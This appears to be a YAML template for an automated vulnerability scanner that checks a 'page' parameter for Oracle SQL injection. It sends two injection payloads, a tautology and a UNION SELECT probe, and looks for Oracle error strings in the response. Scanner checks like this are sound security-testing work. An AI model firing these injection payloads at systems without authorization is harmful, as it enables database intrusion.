id: sqli-oracle-09
name: 'SQLi error oracle via page'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''' OR ''1''=''1'
        - ''' UNION SELECT NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
